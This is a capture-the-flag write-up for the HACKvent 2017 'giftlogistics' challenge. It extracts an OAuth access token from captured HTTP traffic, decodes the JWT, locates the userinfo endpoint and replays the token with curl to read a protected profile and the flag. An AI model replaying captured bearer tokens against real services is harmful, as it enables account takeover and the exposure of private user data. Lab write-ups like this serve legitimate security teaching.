# Day 12: giftlogistics

*countercomplete inmeasure*

Most passwords of Santa GiftLogistics were stolen. You find an example of the traffic for Santa's account with password and everything. The Elves CSIRT Team detected this and made sure that everyone changed their password.

Unfortunately this was an incomplete countermeasure. It's still possible to retrieve the protected user profile data where you will find the flag.


[Link](http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/) + [Traffic](files/giftlogistics.pcapng "giftlogistics.pcapng")

### Solution

To find the flag we have to find the protected user profile data first. Let's analyze the captured traffic using Wireshark and focus on HTTP protocol.

We are lucky because we can see an authorization request and following response containing an access token.

```
GET /giftlogistics/authorize?response_type=token%20id_token&client_id=a75b4722-141d-4c00-b65c-5dc279146b60&scope=openid+profile&redirect_uri=http%3A%2F%2Ftransporter.hacking-lab.com%2Fclient&nonce=196f7b9ca4e9c&state=e6ec344ec594 HTTP/1.1
Host: challenges.hackvent.hacking-lab.com:7240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/login
Cookie: JSESSIONID=0F785B5D7FC9A54FC995BF9C40B54C81; i18next=en
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
X-Frame-Options: DENY
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache
Cache-Control: no-store
Location: http://transporter.hacking-lab.com/client#access_token=eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q&token_type=Bearer&state=e6ec344ec594&expires_in=15551999&id_token=eyJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBMV81In0.AjFhnIaX-LLVpdJDMOvkK4MbTreuz3rdAwUfim8NsErrh238expG4O9tazr8gqZep9lCbHpieqiFRD8yRhF1-BA-EdmV9zO_Ilerrtfra1_AC5ozYV6wt1nK7cyzUm77mdpEzRZ9yhlMLrvk6FSh0lxlO6XwbJq6AL_KUsZza0kgsNVdUw3EsoAKYwZhVuzIgCLEQ1McRpEoCE9KESjKEgOgf0XoLZN-kqEARMujJH9OpCgIXIsR7ypew7Wp6W2cjWVkedjY2yaofOzedJyP7brZzX_zzPfCHey5dqW4TOlRaMlLaQ5sWIOcA2-HpsIJExoKXWRW0LIdJFS8VPKF4Q.WZtAImcXGL4EjUfw.1s2sKvRDX93EIL529djgN873OjnSXwdhB5FU5QKGt-8c0Qh-FijdssQ_6Mykgazydj8NyxCi0e5H1GogRCiv8ibchvwi4gXdQIeMXUIomHYyn2LuXS5lkARLqPzJIbv_j60NiEbdc1K9t8YuO_jnK1aajoNq2CIsgNRDxfIgbA7TZ8-GWU-Z1dItv2g7-3Ks9pwG2nUnmP0bqifYb9dae5bZe_oS5wBiHdQh43VQFPigY4G7r1dASpG3rnm_v6uqcET96dxN6AECwhW4SFQZKUoGlgv9JkG7HrUjoYbygmE1H3yrNBHQlRxnuWDxLWffsnpoGEVuZEBLyUxNA07t42NomgAdxWAlNvlrSd2veArpX2iEL_0K1u1oHe8_fkWfyWugqu39kuOeCGh2FULM0B-F8nzM6pQIN62uqwiJVJ0.0DDYtfSSe8eq10KFJ2agXw
Content-Language: en
Content-Length: 0
Date: Wed, 22 Nov 2017 21:08:57 GMT

```

Captured access token is:

```
eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q
```

Now we can use [JWT Debugger](https://jwt.io/) to decode its payload.

```json
{
  "sub": "santa",
  "azp": "a75b4722-141d-4c00-b65c-5dc279146b60",
  "iss": "http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/",
  "exp": 1526936936,
  "iat": 1511384936,
  "jti": "819f5f3d-a7c7-44a9-bb96-0fd82f4b7e75"
}
```

It belongs to the protected user *santa* and it's valid until May 2018.

To get the flag we have find endpoint of the user info service. Let's dig into the captured traffic again. 

There's an interesting request to OpenID configuration which might be helpful.

```
GET /giftlogistics/.well-known/openid-configuration HTTP/1.1
Host: challenges.hackvent.hacking-lab.com:7240
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=47C84E645145D6B091619FB8046919FF; i18next=en
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Access-Control-Allow-Origin: *
Content-Type: application/json;charset=ISO-8859-1
Content-Language: en
Content-Length: 3206
Date: Wed, 22 Nov 2017 21:08:24 GMT

{"request_parameter_supported":true,"claims_parameter_supported":false,"introspection_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/introspect","scopes_supported":["openid","profile","email","address","phone","offline_access"],"issuer":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/","userinfo_encryption_enc_values_supported":["A256CBC+HS512","A256GCM","A192GCM","A128GCM","A128CBC-HS256","A192CBC-HS384","A256CBC-HS512","A128CBC+HS256"],"id_token_encryption_enc_values_supported":["A256CBC+HS512","A256GCM","A192GCM","A128GCM","A128CBC-HS256","A192CBC-HS384","A256CBC-HS512","A128CBC+HS256"],"authorization_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/authorize","service_documentation":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/about","request_object_encryption_enc_values_supported":["A256CBC+HS512","A256GCM","A192GCM","A128GCM","A128CBC-HS256","A192CBC-HS384","A256CBC-HS512","A128CBC+HS256"],"userinfo_signing_alg_values_supported":["HS256","HS384","HS512","RS256","RS384","RS512","ES256","ES384","ES512","PS256","PS384","PS512"],"claims_supported":["sub","name","preferred_username","given_name","family_name","middle_name","nickname","profile","picture","website","gender","zoneinfo","locale","updated_at","birthdate","email","email_verified","phone_number","phone_number_verified","address"],"claim_types_supported":["normal"],"op_policy_uri":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/about","token_endpoint_auth_methods_supported":["client_secret_post","client_secret_basic","client_secret_jwt","private_key_jwt","none"],"token_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/token","response_types_supported":["code","token"],"request_uri_parameter_supported":false,"userinfo_encryption_alg_values_supported":["RSA-OAEP","RSA-OAEP-256","RSA1_5"],"grant_types_supported":["authorization_code","implicit","urn:ietf:params:oauth:grant-type:jwt-bearer","client_credentials","urn:ietf:params:oauth:grant_type:redelegate"],"revocation_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/revoke","userinfo_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo","token_endpoint_auth_signing_alg_values_supported":["HS256","HS384","HS512","RS256","RS384","RS512","ES256","ES384","ES512","PS256","PS384","PS512"],"op_tos_uri":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/about","require_request_uri_registration":false,"id_token_encryption_alg_values_supported":["RSA-OAEP","RSA-OAEP-256","RSA1_5"],"jwks_uri":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/jwk","subject_types_supported":["public","pairwise"],"id_token_signing_alg_values_supported":["HS256","HS384","HS512","RS256","RS384","RS512","ES256","ES384","ES512","PS256","PS384","PS512","none"],"registration_endpoint":"http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/register","request_object_signing_alg_values_supported":["HS256","HS384","HS512","RS256","RS384","RS512","ES256","ES384","ES512","PS256","PS384","PS512"],"request_object_encryption_alg_values_supported":["RSA-OAEP","RSA-OAEP-256","RSA1_5"]}
```

As we can see the user info service endpoint is: 

```
http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo
```

The last thing to do is to call this endpoint with the captured access token.

```
$ curl http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo \
  -H 'authorization: Bearer eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q'
{"sub":"HV17-eUOF-mPJY-ruga-fUFq-EhOx","name":"Reginald Thumblewood","preferred_username":"santa"}
```

The result flag is:

```
HV17-eUOF-mPJY-ruga-fUFq-EhOx
```
